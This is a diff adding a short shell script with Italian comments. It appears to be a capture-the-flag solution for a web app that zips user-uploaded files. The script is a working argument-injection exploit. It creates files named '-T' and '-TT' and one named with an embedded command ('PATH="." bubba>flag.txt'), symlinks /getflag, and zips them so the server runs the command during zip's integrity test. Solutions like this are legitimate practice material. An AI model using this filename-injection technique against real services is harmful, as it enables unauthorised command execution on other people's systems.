@@ -1,0 +1,25 @@
+# Bisogna creare il symlink al comando '/getflag'...
+ln -s /getflag bubba
+
+# Dal manuale di 'zip' si possono notare le flag '-T' e '-TT' che servono
+# rispettivamente per il controllo d'integrità d'archivio e l'esecuzione
+# di un comando per il controllo, al posto del solito usato da 'zip'.
+# Siccome appende alla lista 'commands' i nomi dei file che gli passiamo,
+# possiamo creare una serie di files i cui nomi sono gli argomenti che
+# verranno poi passati al comando 'zip'.
+# Quindi dobbiamo creare dei file con i nomi che vogliamo noi:
+touch ./-T
+touch ./-TT
+
+# Siccome non è possibile inserire '/' all'interno del nome di un file,
+# bisogna trovare un altro modo per poter chiamare la procedure '/getflag'.
+# Possiamo cambiare il PATH alla directory corrente (della Web App) in modo
+# che l'esecuzione del comando 'getflag' avvenga dalla directory corrente.
+touch 'PATH="." bubba>flag.txt'
+touch ./flag.txt
+
+# Ora possiamo zippare il tutto e inviarlo (ricordarsi di '-y' per mantenere
+# il symlink come link e non come reference file!).
+zip pippo.zip -y ./-T ./-TT ./'PATH="." bubba>flag.txt' ./flag.txt ./bubba
+
+# NOTA: La flag non si trova nello zip che verrà scaricato ma nel file caricato!
